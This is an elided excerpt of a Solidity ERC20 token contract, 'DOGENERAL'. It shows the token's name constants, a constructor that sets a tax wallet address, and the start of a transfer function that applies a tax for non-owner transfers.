...
contract Contract is Context, IERC20, Ownable {
    ...
    string private constant _name = unicode"DOGENERAL";
    string private constant _symbol = unicode"DOGENERAL";
    ...
    constructor () {
        _taxWallet = payable(0xF12e6d51039621738e70C8b521957063530a48C1);
    ...
    function _transfer(address from, address to, uint256 amount) private {
        ...
        if (from!=owner() && to!=owner()) {
            if (_buyCount > 0 && swapEnabled){
                taxAmount = _initialTaxSend(amount,from,to);
            }
    ...
    function _initialTaxSend(uint256 amount, address from, address to) private returns(uint256) {
